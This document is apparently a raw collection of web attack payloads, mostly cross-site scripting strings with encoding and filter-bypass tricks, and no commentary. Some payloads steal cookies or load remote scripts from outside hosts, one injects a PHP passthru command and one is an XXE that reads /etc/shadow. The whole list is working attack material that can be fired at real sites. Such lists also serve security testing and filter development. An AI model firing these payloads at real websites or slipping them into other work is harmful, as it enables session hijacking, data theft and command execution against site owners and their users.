&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
<iframe/src='javascript:if(null==null){javascript:0?1:confirm(1);}'>
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
&keyword=k61161&pageid=icb.page316368&pageContentId=icb.pagecontent828781&view=view.do&state=maximize&viewParam_q=<script>alert('0');</script>
"""]<img src=1 onerror=confirm(1)>"
<iframe src=http://ha.ckers.org/scriptlet.html <
<!--[if<img src=x:x onerror=confirm(5)//]-->
'><script>alert(\'\\\\1\\\\\')</script>
'></TITLE><SCRIPT>alert(1);</SCRIPT>
""";location=location.hash)//#0={};alert(0)"
"object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>"
"&source=""><script>alert(String.fromCharCode(88,83,83))</script>"
<embed onfocus='popup=1;'><img
"![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\"
"'"">><script>alert('XSS')</script>"
"<iframe src=""""//srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>"
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
';alert(123);t='
&error=catalogue.asp
<svg><script><![CDATA[\]]><![CDATA[u0061]]><![CDATA[lert]]>(1)</script>
&q=%27;alert%28/XSSPOSED%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//&q=%27;alert%280%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//
"""'`>ABC<div style=""font-family:'foo'*chr*x:expression(log(*num*));/*';"">DEF"
"<a href=""[a]java[b]script[c]:alert(1)"">XXX</a>"
"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>"
"""><div style=""font-family:'foo[a];color:red;';"">XXX</div>"
<marquee/onstart=document.body.innerHTML=location.hash>//#<img src=x onerror=prompt(1)>>
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>"
<svg><script /* /*/*/*>\u0061l\u0065rt`X`
&v=xss'%3E%3C/a%3E%3Cscript%20src%3D%22http://www.yourjavascript.com/38310202111/xss.js%22%3E%3C/script%3E
"<svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:\u0061lert(1);""></g></svg>"
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
&s=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F
"<A HREF=""http://127.0.0.1:3555/xss_serve_payloads/X.html@google"">X</A"
"""><meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>"
setInterval`alert\x28document.domain\x29`
"""<xml ID=""""xss""""><I><B><IMG SRC=""""javas<!-- -->cript:alert('XSS')""""></B></I></xml><SPAN DATASRC=""""#xss"""" DATAFLD=""""B"""" DATAFORMATAS=""""HTML""""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"""
"""><iframe<?php echo chr(12)?> onload=alert(1)></iframe>"
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>"
<img/src=` onerror=confirm(1)>
"'><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script ​​​​​​​​​​​​"
"<object data=""data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==""></object>"
"<iframe src=""&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;""></iframe>"
"""'`><script>a=/xss;*chr*;i=0;log(*num*);a/i;</script>"
<ScRIPt>prompt(1)</ScRIPt>
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>"
"<img+<iframe =""1"" onerror=""alert(1)"">"
<style/onload    =    !-confirm&#x28;1&#x29;>
"""/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);confirm(1)>"
"""><p id=""""onmouseover=\u0070rompt(1) //"
"'><a onmouseover=""javascript:window.onerror=alert;throw 1>"
"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
"<img \x00src=x onerror=""javascript:alert(1)"">"
http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
"\\"";alert('XSS');//"
"<base href=""javascript:\""> <a href=""//%0aalert(5);//"">"
javascript:\u0061lert&#x28;1&#x29
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>"
<input onblur=focus() autofocus><input>
<body oninput=javascript:alert(1)><input autofocus>
<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT>
""" onfocus=""write(unescape('&#60;')+'script src='+unescape('&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;')"
'><script<{alert(1)}/></script </>
"""><script async>alert(1);</script async>"
javas&Tab;cript:\u0061lert(1);
'><iframe///////onload=alert(1)></iframe>
"""><input type=""text"" AUTOFOCUS onfocus=alert(1)>"
javascript<TAB>:alert(1)
"<div style=""z:exp/*anything*/res/*here*/sion(alert(1))"" />"
"&searchType=global&N=0&Ntt=;!--""<iframe src='http://reddit.com/r/xss' width='1024' height='600'></iframe>"
"""><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​"
&q=wewt%3C/title%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E
500);alert(1);//
"data:text/html,<script>alert(1)</script>"
"""><iMg onerror=alert(1) src=a>"
-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
"<BGSOUND SRC=""javascript:alert(\'XSS\');"">"
"<input type=""text"" name=""a"""
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%22)};document.body.appendChild(x);</script>"
"""onfocus=""window['\141\154\145\162\164']('\130\123\123')"""
"""<marquee/onstart=confirm(/XSS/.source);confirm(1)>"""
--!><svg onload=prompt(1)
%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
"&q=""><script>alert(""xss"")</script>"
"&storeId=10701%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E&catalogId=10051"
+alert(1)&&null=='
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
<3 </3
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}"
<form action=javascript&NewLine;:alert(1)><input type=submit>
"<A HREF=""javascript&#09;:alert(1)"">"
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>"
"'><SCRIPT> alert(\""1\"");</SCRIPT>"
'><keygen autofocus onfocus=alert(1)>
"""><IMG SRC=`javascript:alert(“X says, ‘X’”)`>"
&keywords=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&per_page=15
confirm(1)>>>/xss
"'><XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert(1);"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
‘-prompt(1)-’
"""onclick=""alert('XSS')"""
"""><img src=x onerror=document.body.innerHTML=location.hash>#""><img/src='x'onerror=prompt(1)>"
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>"
"&lt;SCRIPT =\\""&gt;\\"" SRC=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\""&gt;&lt;/SCRIPT&gt;"
&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;
"<IMG SRC=""javascript:alert(\'XSS\')"""
"'></script>""//'//<svg%0Aonload=alert(1) //>"
"""<STYLE>.XSS{background-image:url(""""javascript:alert('XSS')"""");}</STYLE><A CLASS=XSS></A>"""
"""><b><script<b></b><alert(1)</script </b></b>"
"getURL(""javascript:confirm(document.location)"")"
"'><image src=""javascript:alert(1)"">"
&text=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
&q=%22%20style=background:red;left:0;top:0;height:500px;width:500px;position%20:absolute;z-index:1000%20onmouseover=alert(/XSSPOSED/)%20%22
‘/><script>prompt(1)</script>
"<div style=""font-family:'foo[a];color:red;';"">XXX</div>"
&action=search&storeid=2557708&searchtext=%22%3Cscript%3Ealert('Hello%20Reddit')%3C/script%3E&submitbutton.x=0&submitbutton.y=0
s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];
"<table background=""javascript:alert(1)""></table>"
</stYle/</titLe/</teXtarEa/</scRipt/--!>
'><style onreadystatechange=alert(1)>
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<audio src=x onerror=prompt(1);>
"&node=--><svg><script><!>alert(""XSS"")</script>"
"&opc=2""><script>alert(String.fromCharCode(88,83,83))</script>"
&#X03C
"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.write(data);document.close();"
"<!--#echo var=""total_hits"" -->"
/alert`2`/i
"""<script>alert(""""WXSS"""")</script>"""
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
"\""><sCriPt>alert(0x000123)</sCriPt>"
'></script><script>prompt(1)</script>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
"&lt;A HREF=""http://0x42.0x0000066.0x7.0x93/""&gt;X&lt;/A&gt;"
">""<a href=""javascript#document.cookie=true;"">"
"String.raw`jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`;"
&q=%22};%20alert(%22XSS%22);%3C/script%3E
"<IMG+LOWSRC=""javascript:alert(1);"">"
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
<iframe<?php echo chr(12)?> onload=alert(1)></iframe>
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"
"<div contextmenu=""xss"">Right-Click Here<menu id=""xss""onshow=""prom%25%32%33%25%32%36x70;t(1)"">"
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->"
"&lt;IMG SRC=\""javascript&#058;alert('XSS')\"""
"""><svg><script>alert&#40/1/&#41</script>"
'<'s'v'g' o'n'l'o'a'd'='a'l'e'r't'('7')' '>'
//////////////////////////////////////////////////
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>"
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>"
'><i[%00]mg onerror=alert(1) src=a>
&#0000062;
<isindex type=image src=X.gif onreadystatechange=alert(1)>
"""><script>({0:#0=alert/#0#/#0#(1)})</script>"
"<a href=""\\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<isindex action=javascript:alert(1) type=submit value=click>
"""><svg onload=""javascript:alert(1)"" xmlns=""http://www.w3.org/2000/svg""></svg>"
' '><script>alert(1)</script>
&q=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&header_submit=&src=usergen&ac=
&s=asd%3Cscript%3Ealert(/XSSPOSED/)%3C/script%3E
&apos;; alert(1);//
"&lt;IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
"""></iframe><script>alert(123)</script>"
"*/alert(1)"">'onload=""/*<svg/1='"
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
&#X3C
"'><?xml-stylesheet href=""javascript:alert(1)""?><root/>"
"""/><script x> confirm(1) </script 1=2"
"<a <!-- href=""j&#x61;vascript:&#x61;lert&#x28;31337&#x29;;"">Hello</a>"
"<svg/onload=body[name]=URL%0d#</svg><img src=x onerror=alert(1)>"""
"""><meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>"
">""<style type=""text/javascript"">document.cookie=true;</style>"
"<image src=`` onerror=setTimeout/*(""__"")*/`\u0061lert\u00281\u0029/**/`>"
{${sleep(10)}}
<!-- Hello -- world > <SCRIPT>confirm(1)</SCRIPT> -->
<script itworksinallbrowsers>/*<script* */alert(1)</script ​
"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>"
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
<link%20rel=import%20href=http://avlidienbrunn.se/test.php>
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<? foo=""><x foo='?><script>alert(1)</script>"
<svg><doh onload=confirm(1)>
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';while(1){}location='javascript:1+{}'
"<b/alt=""1""onmouseover=InputBox+1 language=vbs>test</b>"
<body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"<a href=""http://attacker.org""><iframe src=""http://example.org/""></iframe></a>"
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>"
&lt;IMG SRC=JaVaScRiPt:alert(1)&gt;
'><iMg onerror=alert(1) src=a>
<![CDAT<!
"<iframesrc=""javascript:alert(2)"">"
'><title onpropertychange=alert(1)></title><title title=></title>
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
"'';!--\""&lt;XSS&gt;=&{()}"
&#x00003c
"""><audio src=1 onerror=alert(1)>"
"<script src=""/\\%(jscript)s""></script>"
"<IMG SRC=""jav   ascript:alert(\'XSS\');"">"
"<img src=""/"" =_="" title=""onerror=\'prompt(1)\'"">"
"&type=""><script>alert('XSS')</script>"
".replace(/.+/,eval)//"
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />"
<IMG SRC=`javascript:confirm(document.cookie)`>
<IMG SRC=JaVaScRiPt:alert('XSS')>
&#X00003c
"'><script>alert(1);</script>"">"
"&tree=411""><script>alert(String.fromCharCode(88,83,83))</script>"
"'><div style=""font-family:foo}color=red;"">XXX</div>"
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>"
"<IMG SRC=""jav&amp;#x0D;ascript:alert('XSS');"">"
"<IMG SRC=""javascript:javascript:alert(1);"">"
"""><video src=1 onerror=alert(1)>"
"'"">><marquee><img src=x onerror=confirm(1)></marquee>"
""">    ""><iframe src=http://xss.cx onload=confirm(5) <<iframe src=a>    ""><iframe src=http://xss.cx onload=confirm(8) <"
<script src=>confirm(8)</script>
'><object onerror=alert(1)>
document.body.innerHTML=('<\000\0i\000mg src=xx:x onerror=confirm(1)>')
"'><form action=""&Tab;javas&Tab;cript&Tab;:alert('X :)')"" autocomplete=""on""> First name:<input type=""text"" name=""fname""><br><input type=""submit""></form>"
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>"
"<a href=""javas&Tab;cri&NewLine;pt:confirm(1)"">test</a>"
"<img src\\x12=x onerror=""javascript:alert(1)"">"
"<isindex action=""javas&Tab;cript:confirm(1)"" type=image>"
&q=Quadrocopter</span ><script>alert(/XSSPOSED/);</script>
"""><script>eval(‘a\u006cert(1)’);</script>"
"<div style=""width: expression(document.cookie=true;);"">"
"<base href=""mailto://any/<img src=""bod#y""></script>"
;location.href='http://site';//
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
1);error_reporting(0);passthru(base64_decode(\\$_SERVER[HTTP_CMD])
&cn=<script>alert('0');</script>
"'><iframe src=""data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e"">"
"eval(""s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)"")"
"<a href=""x:confirm(1)"" id=""test"">click</a><script>eval(test+'')</script>"
&yr=%3Cbody%20background=http://i.imgur.com/dUS0k.gif%3E&month=05
'><input onblur=alert(1) autofocus><input autofocus>
&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(1)';&lt;/STYLE&gt;
&page=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E%22
">%22%27><img%20src%3d%22javascript:confirm(%27%20XSS%27)%22>'%uff1cscript%uff1econfirm('XSS')%uff1c/script%uff1e'"">>""'';!--""<XSS>=&{()}"
"""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>"
<scr<script>ipt>alert(0x000123)</scr</script>ipt>
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
<script>alert(1)<script>
'><q/oncut=open()>
<select autofocus onfocus=alert`1`
